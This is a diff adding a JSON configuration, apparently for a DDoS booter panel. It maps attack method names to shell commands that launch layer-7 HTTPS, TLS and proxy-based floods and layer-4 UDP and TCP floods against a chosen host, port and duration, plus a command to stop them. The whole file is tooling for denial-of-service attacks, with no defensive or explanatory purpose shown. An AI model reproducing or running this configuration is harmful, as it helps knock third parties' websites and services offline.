@@ -1,0 +1,83 @@
+[
+
+    {
+
+        "methods": "HTTPS",
+
+        "command": "cd /root/methods/layer7/ && [SCREEN_CMD] node https.js [HOST] [TIME] 8 2"
+
+    },
+
+    {
+
+        "methods": "TLS",
+
+        "command": "cd /root/methods/layer7/ && [SCREEN_CMD] node tls.js [HOST] [TIME] 8 2"
+
+    },
+
+    {
+
+        "methods": "CUSTOM",
+
+        "command": "cd /root/methods/layer7/ && [SCREEN_CMD] node https.js [HOST] [TIME] 8 2"
+
+    },
+
+    {
+
+        "methods": "FOX",
+
+        "command": "cd /root/methods/layer7/ && [SCREEN_CMD] node fox.js [HOST] [TIME] 3 proxy.txt 8"
+
+    },
+
+    {
+
+        "methods": "BROWSER",
+
+        "command": "cd /root/methods/layer7/ && [SCREEN_CMD] node Eifol.js [HOST] [TIME] 8 2 proxy.txt"
+
+    },
+
+    {
+
+        "methods": "MURDER",
+
+        "command": "cd /root/methods/layer7/ && [SCREEN_CMD] node Murder.js [HOST] [TIME] 8 2 proxy.txt"
+
+    },
+
+    {
+
+        "methods": "UDP",
+
+        "command": "cd /root/methods/layer4/ && [SCREEN_CMD] python3 udp.py [HOST] [PORT] [TIME]"
+
+    },
+
+    {
+
+        "methods": "TCP",
+
+        "command": "cd /root/methods/layer4/ && [SCREEN_CMD] python3 tcp.py [HOST] [PORT] [TIME]"
+
+    },
+
+    {
+
+        "methods": "UDPFLOOD",
+
+        "command": "cd /root/methods/layer4/ && [SCREEN_CMD] python3 udpflood.py [HOST] [PORT] 3 2 [TIME]"
+
+    },
+
+    {
+
+        "methods": "STOP",
+
+        "command": "pkill -f [SCREEN_NAME]"
+
+    }
+
+]
